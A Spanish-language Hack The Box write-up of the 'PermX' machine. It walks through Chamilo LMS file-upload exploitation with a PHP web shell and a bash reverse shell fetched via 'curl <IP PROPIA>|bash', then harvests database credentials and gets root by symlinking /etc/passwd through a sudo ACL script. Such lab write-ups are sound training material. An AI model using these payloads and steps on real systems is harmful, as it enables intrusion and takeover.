---
category: Hack The Box
tags:
  - eJPT
  - eWPT
title: Machine Permx
comments: true
image: /assets/img/machines/permx/permxbanner.jpeg
---
# Introducción

`PermX` es una máquina Linux de dificultad fácil con un sistema de gestión de aprendizaje vulnerable a la carga de archivos sin restricciones a través de [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220). Esta vulnerabilidad se aprovecha para establecerse en la máquina. Al enumerarla, se revelan las credenciales que permiten el acceso SSH. Una configuración incorrecta de `sudo` se explota para obtener un shell `root`.

### Skills

- Chamilo LMS Exploitation - Unauthenticated Command Injection (CVE-2023-31803) (RCE)
- Subdomain Enumeration
- Information Leakage
- Abusing Sudoers - Custom Bash Script (playing with setfacl) (Privilege Escalation)

# Enumeración

```bash
nmap -sCV -p22,80 10.10.11.23

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-29 22:12 -04
Nmap scan report for 10.10.11.23
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds
```

### Puertos

- 22 ----> OpenSSH 8.9P1 Ubuntu 3Ubuntu0.10
- 80 ----> http Apache httpd 2.4.52


# Chamilo LMS Exploitation

#### rce.php

Este archivo PHP permite la ejecución remota de comandos en el sistema:

```php
<?php
  system($_GET['cmd']);
?>
```

Subida del archivo rce.php mediante `curl`

```bash
curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```

lanza consulta si se ha subido 
```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
```

#### index.html

Este script de Bash abre una conexión desde la víctima hacia `<IP PROPIA>` en el puerto `443`.

```bash
#!/bin/bash
bash -i >& /dev/tcp/<IP PROPIA>/443 0>&1
```

#### Servidor HTTP con Python

```bash
python3 -m http.server 80
```

#### Ejecución de código en la víctima con `curl`

```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=curl+<IP PROPIA>|bash'
```

#### Escucha de conexión con `nc` (Netcat)

```bash
nc -nlvp 443
```


# Information Leakage

#### acceso usuario mtz

Este archivo contiene la configuración de la aplicación web **Chamilo** (un LMS o sistema de gestión de aprendizaje).
```bash
www-data@permx:/var/www/chamilo$ cat ./app/config/configuration.php | less -S
```

```shell
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

```bash
www-data@permx:/var/www/chamilo$ mysql -u chamilo -p
```

```shell
MariaDB [(none)]> show databases;
MariaDB [(none)]> use chamilo;
MariaDB [(none)]> show tables;
MariaDB [(none)]> describe user;
MariaDB [(none)]> select username,password from user;
```
```
---------------------------------------------------------------------------
| username | password                                                     |
---------------------------------------------------------------------------
| admin    | $2y$04$1Ddsofn9m0aa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra | 
| anon     | $2y$04$wyjp2UVTeiD/jF40doYDquf4e70Wi6a3sohKRDe80IHAyihX0ujdS |
---------------------------------------------------------------------------
```

```bash
www-data@permx:/var/www/chamilo$ su mtz
password:
mtz@permx:/var/www/chamilo$ cd
mtz@permx:~$ cat user.txt
```

# Abusing Sudoers - Custom Bash Script (playing with setfacl) (Privilege Escalation)

El script `/opt/acl.sh` permite asignar permisos a archivos dentro de `/home/mtz/` utilizando **ACLs (Access Control Lists)** en Linux. Recibe tres parámetros: usuario, perm y target, validando que se proporcionen correctamente. Solo permite modificar archivos dentro de `/home/mtz/` y bloquea rutas con `..` para evitar accesos no autorizados. Además, verifica que el archivo exista antes de aplicar los permisos con `setfacl`, ejecutándolo con `sudo`. Si no se cumplen estas condiciones, el script muestra mensajes de error y finaliza la ejecución.

```bash
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
	/usr/bin/echo "Usage: $0 user perm file"
	 exit 1 
fi 

user="$1" 
perm="$2" 
target="$3" 

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
	/usr/bin/echo "Access denied."
	 exit 1
fi 

# Check if the path is a file
if [ ! -f "$target" ]; then
	/usr/bin/echo "Target must be a file." 
	exit 1 
fi 

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

**enlace simbólico** con el comando:
```bash
mtz@permx:~$ ln -s /etc/passwd passwd
```
Esto genera un archivo `passwd` en `/home/mtz/` que en realidad apunta a `/etc/passwd`, el archivo del sistema que almacena información de usuarios.

luego, ejecuta:
```bash
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd 
```
El script `/opt/acl.sh` verifica que el archivo esté dentro de `/home/mtz/` (lo cual el enlace simbólico cumple) y luego usa `setfacl` para asignar permisos `rwx` (lectura, escritura y ejecución) al usuario `mtz` sobre `passwd`. 

Generación de una contraseña cifrada:
```bash
mtz@permx:~$ openssl passwd
password: hola
verifying - Password: hola
```
```
$1$y4lisSqP$4rk6FNJ/Xsb/myhjeS6Lk.
```
Este comando solicita una contraseña y la cifra utilizando el algoritmo predeterminado (normalmente MD5, SHA-256 o SHA-512, según la configuración del sistema).


Edición del archivo `passwd`:
```bash
mtz@permx:~$ nano passwd
```
```
root:$1$y4lisSqP$4rk6FNJ/Xsb/myhjeS6Lk.:0:0:root:/root:/bin/bash
```
Esto cambia la contraseña de `root` a la generada con `openssl passwd`.


```bash
mtz@permx:~$ su root
password: hola
root@permx:~$ cd /root/
root@permx:~$ cat root.txt
```



